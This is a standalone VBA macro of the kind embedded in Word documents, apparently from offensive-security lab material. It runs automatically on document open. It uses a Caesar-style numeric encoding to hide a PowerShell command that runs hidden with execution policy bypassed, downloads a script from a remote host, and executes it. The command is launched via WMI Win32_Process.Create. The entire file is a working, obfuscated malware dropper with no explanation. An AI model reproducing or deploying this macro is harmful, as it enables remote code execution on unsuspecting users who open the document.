Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
  
    Dim str As String
    Dim Water As String
    str = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069074063066069066064133118132133063133137133056058058"
    Water = Nuts(str)
    GetObject(Nuts("136122127126120126133132075")).Get("Win32_Process").Create Water, Chicken, Dinner, pid
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function
Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function
Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
